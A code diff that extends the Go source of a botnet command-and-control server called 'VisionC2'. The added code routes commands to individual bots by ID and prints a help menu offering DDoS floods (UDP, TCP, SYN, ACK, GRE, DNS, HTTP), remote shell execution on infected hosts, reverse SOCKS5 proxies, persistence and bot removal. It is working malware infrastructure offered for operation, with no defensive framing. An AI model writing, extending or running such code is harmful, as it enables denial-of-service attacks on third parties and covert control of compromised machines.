@@ -8,7 +8,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"math/rand"
 	"net"
 	"os"
@@ -634,6 +633,41 @@ func sendToBots(command string) {
 	fmt.Printf("[COMMAND] Sent to %d/%d bots: %s\n", sentCount, len(botConnections), command)
 }
 
+// Send command to a specific bot by ID
+func sendToBot(botID string, command string) bool {
+	botConnsLock.RLock()
+	defer botConnsLock.RUnlock()
+
+	for id, botConn := range botConnections {
+		if id == botID || strings.HasPrefix(id, botID) {
+			if botConn.authenticated {
+				_, err := botConn.conn.Write([]byte(command + "\n"))
+				if err != nil {
+					fmt.Printf("[ERROR] Failed to send to bot %s: %v\n", botConn.botID, err)
+					go removeBotConnection(botConn.botID)
+					return false
+				}
+				fmt.Printf("[COMMAND] Sent to bot %s: %s\n", botConn.botID, command)
+				return true
+			}
+		}
+	}
+	return false
+}
+
+// Find bot by ID (full or partial match)
+func findBotByID(botID string) *BotConnection {
+	botConnsLock.RLock()
+	defer botConnsLock.RUnlock()
+
+	for id, botConn := range botConnections {
+		if id == botID || strings.HasPrefix(id, botID) {
+			return botConn
+		}
+	}
+	return nil
+}
+
 func handleRequest(conn net.Conn) {
 	conn.Write([]byte(getConsoleTitleAnsi("☾℣☽")))
 	readString, err := bufio.NewReader(conn).ReadString('\n')
@@ -768,26 +802,61 @@ func handleRequest(conn net.Conn) {
 				case "persist":
 					sendToBots("!persist")
 				case "help":
-					conn.Write([]byte("\x1b[38;5;231m -> [ bots, clear, help, db, ongoing, private] \n\r"))
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\033[1;97m╔══════════════════════════════════════════════════════════════╗\r\n"))
+					conn.Write([]byte("\033[1;97m║                    \033[1;31mVisionC2 Help Menu\033[1;97m                        ║\r\n"))
+					conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
+					conn.Write([]byte("\033[1;97m║  \033[1;32mGeneral Commands\033[1;97m                                           ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    bots          - List all connected bots                   ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    clear/cls     - Clear screen                              ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    banner        - Show banner                               ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    help/?        - Show this help menu                       ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    db            - Show user database                        ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    ongoing       - Show ongoing attacks                      ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    logout/exit   - Disconnect from C2                        ║\r\n"))
+					conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
+					conn.Write([]byte("\033[1;97m║  \033[1;33mBot Targeting\033[1;97m                                              ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !<botid> <cmd>  - Send command to specific bot            ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    Example: !abc123 !shell whoami                            ║\r\n"))
+					conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
+					conn.Write([]byte("\033[1;97m║  \033[1;31mAttack Commands\033[1;97m (sent to ALL bots)                        ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !udpflood <ip> <port> <time>                              ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !tcpflood <ip> <port> <time>                              ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !http     <ip> <port> <time>                              ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !syn      <ip> <port> <time>                              ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !ack      <ip> <port> <time>                              ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !gre      <ip> <port> <time>                              ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !dns      <ip> <port> <time>                              ║\r\n"))
+					conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
+					conn.Write([]byte("\033[1;97m║  \033[1;36mShell Commands\033[1;97m (sent to ALL bots)                         ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !shell  <cmd>  - Execute command and get output           ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !stream <cmd>  - Stream command output                    ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !detach <cmd>  - Run command in background                ║\r\n"))
+					conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
+					conn.Write([]byte("\033[1;97m║  \033[1;35mSOCKS Proxy Commands\033[1;97m                                       ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !socks <port>     - Start reverse SOCKS5 on bot           ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !stopsocks        - Stop SOCKS proxy                      ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !<botid> !socks <port> - Start SOCKS on specific bot      ║\r\n"))
+					conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
+					conn.Write([]byte("\033[1;97m║  \033[1;34mBot Management\033[1;97m (sent to ALL bots)                         ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !persist        - Setup persistence                       ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !reinstall      - Force reinstall bot                     ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !lolnogtfo      - Kill/remove bot                         ║\r\n"))
+					conn.Write([]byte("\033[1;97m║    !info           - Get bot info                            ║\r\n"))
+					conn.Write([]byte("\033[1;97m╚══════════════════════════════════════════════════════════════╝\r\n"))
+					conn.Write([]byte("\033[0m\r\n"))
 				case "db":
-					file, err := os.Open("./users.json")
+					data, err := os.ReadFile("./users.json")
 					if err != nil {
-						conn.Write([]byte(fmt.Sprintf("Error opening credentials file: %v\r\n", err)))
-						return
-					}
-					defer file.Close()
-
-					data, err := ioutil.ReadAll(file)
-					if err != nil {
-						conn.Write([]byte(fmt.Sprintf("Error reading file: %v\r\n", err)))
-						return
+						conn.Write([]byte(fmt.Sprintf("Error reading credentials file: %v\r\n", err)))
+						continue
 					}
 
 					var credentials []Credential
 					err = json.Unmarshal(data, &credentials)
 					if err != nil {
 						conn.Write([]byte(fmt.Sprintf("Error parsing JSON: %v\r\n", err)))
-						return
+						continue
 					}
 
 					for _, cred := range credentials {
@@ -799,20 +868,67 @@ func handleRequest(conn net.Conn) {
 					}
 
 				case "?":
-					conn.Write([]byte("====== ATTACKS ====== \n\r"))
-					conn.Write([]byte("!udpflood\n\r"))
-					conn.Write([]byte("!tcpflood\n\r"))
-					conn.Write([]byte("!http\n\r"))
-					conn.Write([]byte("!syn\n\r"))
-					conn.Write([]byte("!ack\n\r"))
-					conn.Write([]byte("!gre\n\r"))
+					conn.Write([]byte("\033[1;33mType 'help' for full command list\r\n\033[0m"))
 
 				case "private":
-					conn.Write([]byte("!persist\n\r "))
-					conn.Write([]byte("!lolnogtfo \n\r"))
+					conn.Write([]byte("\033[1;35m=== Private Commands ===\r\n"))
+					conn.Write([]byte("!persist     - Setup persistence mechanisms\r\n"))
+					conn.Write([]byte("!lolnogtfo   - Kill/remove bot from system\r\n"))
+					conn.Write([]byte("!reinstall   - Force reinstall bot\r\n"))
+					conn.Write([]byte("!info        - Get detailed bot info\r\n"))
+					conn.Write([]byte("!socks <port> - Start SOCKS5 proxy\r\n"))
+					conn.Write([]byte("!stopsocks   - Stop SOCKS5 proxy\r\n\033[0m"))
+
+				case "!socks":
+					if len(parts) < 2 {
+						conn.Write([]byte("Usage: !socks <port>\r\n"))
+						conn.Write([]byte("Example: !socks 1080\r\n"))
+						continue
+					}
+					port := parts[1]
+					sendToBots(fmt.Sprintf("!socks %s", port))
+					conn.Write([]byte(fmt.Sprintf("\033[1;35mSOCKS5 proxy started on port %s for all bots\r\n\033[0m", port)))
+
+				case "!stopsocks":
+					sendToBots("!stopsocks")
+					conn.Write([]byte("\033[1;35mSOCKS5 proxy stop command sent to all bots\r\n\033[0m"))
+
+				case "!info":
+					sendToBots("!info")
+					conn.Write([]byte("Info request sent to all bots\r\n"))
+
 				default:
+					// Check if this is a bot-targeted command: !<botid> <command>
+					if strings.HasPrefix(command, "!") && len(parts) >= 2 {
+						botID := strings.TrimPrefix(parts[0], "!")
+						// Check if this looks like a bot ID (not a known command)
+						knownCommands := map[string]bool{
+							"udpflood": true, "tcpflood": true, "http": true, "syn": true,
+							"ack": true, "gre": true, "dns": true, "shell": true, "exec": true,
+							"detach": true, "bg": true, "persist": true, "kill": true,
+							"reinstall": true, "lolnogtfo": true, "socks": true, "stopsocks": true,
+							"info": true, "stream": true,
+						}
+
+						if !knownCommands[botID] {
+							// This is a bot-targeted command
+							targetCmd := strings.Join(parts[1:], " ")
+							bot := findBotByID(botID)
+							if bot != nil {
+								if sendToBot(botID, targetCmd) {
+									conn.Write([]byte(fmt.Sprintf("\033[1;33mCommand sent to bot %s: %s\r\n\033[0m", bot.botID, targetCmd)))
+								} else {
+									conn.Write([]byte(fmt.Sprintf("\033[1;31mFailed to send command to bot %s\r\n\033[0m", botID)))
+								}
+							} else {
+								conn.Write([]byte(fmt.Sprintf("\033[1;31mBot not found: %s\r\n\033[0m", botID)))
+								conn.Write([]byte("Use 'bots' command to see connected bots\r\n"))
+							}
+							continue
+						}
+					}
 					fmt.Printf("Received input: '%s'\n", readString)
-					conn.Write([]byte("Invalid command.\n\r"))
+					conn.Write([]byte("Invalid command. Type 'help' for available commands.\n\r"))
 				}
 			}
 		}
